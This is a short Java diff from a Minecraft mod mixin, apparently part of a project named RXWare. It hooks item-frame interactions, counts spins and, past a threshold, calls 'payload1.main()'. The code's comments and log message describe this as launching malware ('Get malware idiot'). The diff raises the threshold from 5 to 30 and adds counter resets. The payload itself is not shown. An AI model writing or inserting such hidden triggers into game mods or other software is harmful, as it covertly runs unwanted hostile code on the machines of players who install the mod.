@@ -41,11 +41,12 @@ public class ItemFrameInteractMixin {
             spinAmount = 0;
         }
         // This will be the part that makes the malware window
-        if (spinAmount >= 5) {
+        if (spinAmount >= 30) {
             RXWare.LOGGER.info("Get malware idiot");
             System.out.println("Boundry test");
-
             payload1.main(); //Execute payload
+            spinAmount = 0;
+            RXWare.tickTimer = 0;
         }
     }
 }
